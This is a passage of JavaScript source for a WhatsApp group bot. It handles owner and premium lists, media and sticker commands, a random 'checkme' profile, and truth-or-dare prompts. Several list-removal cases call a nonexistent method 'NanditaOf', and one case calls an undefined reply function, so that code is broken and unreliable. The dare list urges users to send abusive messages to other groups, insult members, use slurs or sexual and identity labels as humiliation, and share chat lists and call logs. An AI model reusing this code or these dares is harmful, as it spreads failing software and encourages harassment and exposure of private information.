break  
case 'getcase':
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("Zenitsu3.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replygcdeepak(`${getCase(q)}`)
break
case 'addprem':
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} 918348225320`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await DeepakBotInc.onWhatsApp(prrkek)
if (ceknya.length == 0) return replygcdeepak(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcdeepak(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} nomor\nExample ${prefix+command} 918348225320`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.NanditaOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replygcdeepak(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Whats the word?')
if (BadDeepak.includes(q)) return replygcdeepak("The word is already in use")
BadDeepak.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadDeepak))
replygcdeepak(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Enter the word')
if (!BadDeepak.includes(q)) return replygcdeepak("The word does not exist in the database")
let wanu = BadDeepak.NanditaOf(q)
BadDeepak.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadDeepak))
replygcdeepak(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadDeepak) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addvideo':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Whats the video name?')
if (VideoDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
VideoDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/video/${q}.mp4`)
fs.writeFileSync('./DeepakMedia/database/deepakvideo.json', JSON.stringify(VideoDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Enter the video name')
if (!VideoDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = VideoDeepak.NanditaOf(q)
VideoDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepakvideo.json', JSON.stringify(VideoDeepak))
fs.unlinkSync(`./DeepakMedia/video/${q}.mp4`)
replygcdeepak(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoDeepak) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addimage':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Whats the image name?')
if (ImageDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
ImageDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/image/${q}.jpg`)
fs.writeFileSync('./DeepakMedia/database/deepakimage.json', JSON.stringify(ImageDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Enter the image name')
if (!ImageDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = ImageDeepak.NanditaOf(q)
ImageDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepakimage.json', JSON.stringify(ImageDeepak))
fs.unlinkSync(`./DeepakMedia/image/${q}.jpg`)
replygcdeepak(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageDeepak) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addsticker':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Whats the sticker name?')
if (StickerDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
StickerDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/sticker/${q}.webp`)
fs.writeFileSync('./DeepakMedia/database/deepaksticker.json', JSON.stringify(StickerDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Enter the sticker name')
if (!StickerDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = StickerDeepak.NanditaOf(q)
StickerDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepaksticker.json', JSON.stringify(StickerDeepak))
fs.unlinkSync(`./DeepakMedia/sticker/${q}.webp`)
replygcdeepak(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerDeepak) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addvn':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Whats the audio name?')
if (VoiceNoteDeepak.includes(q)) return replygcdeepak("The name is already in use")
let delb = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteDeepak.push(q)
await fsx.copy(delb, `./DeepakMedia/audio/${q}.mp3`)
fs.writeFileSync('./DeepakMedia/database/deepakvn.json', JSON.stringify(VoiceNoteDeepak))
fs.unlinkSync(delb)
replygcdeepak(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (args.length < 1) return replygcdeepak('Enter the vn name')
if (!VoiceNoteDeepak.includes(q)) return replygcdeepak("The name does not exist in the database")
let wanu = VoiceNoteDeepak.NanditaOf(q)
VoiceNoteDeepak.splice(wanu, 1)
fs.writeFileSync('./DeepakMedia/database/deepakvn.json', JSON.stringify(VoiceNoteDeepak))
fs.unlinkSync(`./DeepakMedia/audio/${q}.mp3`)
replygcdeepak(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteDeepak) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteDeepak.length}*`
replygcdeepak(teks)
}
break
case 'addowner':
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await DeepakBotInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcdeepak(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcdeepak(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!args[0]) return replygcdeepak(`Use ${prefix+command} nomor\nExample ${prefix+command} 918348225320`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.NanditaOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replygcdeepak(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let DeepakBotInc of prem) {
teks += `- ${DeepakBotInc}\n`
}
teks += `\n*Total : ${prem.length}*`
DeepakBotInc.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setexif': {
               if (!DeepakTheCreator) return replygcdeepak(mess.owner)
               if (!text) return replygcdeepak(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replygcxeom(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'setppbot': case 'setbotpp': {
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!quoted) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/panjang`) {
var { img } = await generateProfilePicture(medis)
await DeepakBotInc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcdeepak(`Success`)
} else {
var memeg = await DeepakBotInc.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcdeepak(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!DeepakTheCreator) return replygcdeepak(mess.owner)
if (!args.join(" ")) return replygcdeepak(`Use ${prefix+command} groupname`)
try {
let cret = await DeepakBotInc.groupCreate(args.join(" "), [])
let response = await DeepakBotInc.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
DeepakBotInc.sendMessage(m.chat, { text:teks, mentions: await DeepakBotInc.parseMention(teks)}, {quoted:m})
} catch {
replygcdeepak("Error!")
}
}
break
case 'snobg': {
if (!quoted) return replygcdeepak(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
replygcdeepak(`Send/Reply Images With Captions ${prefix+command}`)
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
if (!isPrem) return replyprem(mess.premium)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
DeepakBotInc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tourl':
try {
if (!isMedia) return replygcdeepak(`Send/Reply Photos/Videos With Captions ${prefix + command}`)
mee = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
DeepakBotInc.sendMessage(m.chat, {text:mem},{quoted:m})
} catch (err) {
replygcdeepak(`Reply to an image`)
}
break
case 'tomp4': case 'tovideo': {
                if (!quoted) return replygcdeepak('Reply Image')
                if (!/webp/.test(mime)) return replygcdeepak(`reply sticker with caption *${prefix + command}*`)
                replygcdeepak(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await DeepakBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcdeepak(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replygcdeepak(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            DeepakBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return replygcdeepak(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcdeepak(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return replygcdeepak(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            replygcdeepak(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            DeepakBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${DeepakBotInc.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcdeepak(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replygcdeepak(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            replygcdeepak(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            DeepakBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) return replygcdeepak('Reply video')
                if (!/webp/.test(mime)) return replygcdeepak(`reply sticker with caption *${prefix + command}*`)
                replygcdeepak(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await DeepakBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replygcdeepak(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await DeepakBotInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I missðŸ¥ºðŸ‘‰ðŸ¼ðŸ‘ˆðŸ¼",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice note🤣",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner deepak through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love Dream Guy Deepak through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love you❤️",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const deepakdare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              DeepakBotInc.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ deepakdare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, Deepak?🤣",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const deepaktruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              DeepakBotInc.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ deepaktruth }, {quoted:m})
              break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(ppuser)
DeepakBotInc.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'toimg': {
if (!/webp/.test(mime)) return replygcdeepak(`balas stiker dengan caption *${prefix+command}*`)
let media = await DeepakBotInc.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return replygcdeepak(err)
let buffer = fs.readFileSync(ran)
DeepakBotInc.sendMessage(m.chat, { image: buffer, jpegThumbnail: defaultpp }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPrem) return replyprem(mess.premium)
if (!args.join(" ")) return replygcdeepak(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (m.quoted.isAnimated === true) {
DeepakBotInc.downloadAndSaveMediaMessage(quoted, "gifee")
DeepakBotInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcdeepak('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await DeepakBotInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
} else {
replygcdeepak(`Photo/Video?`)
}
}
break
case 'sticker': 
case 's': {
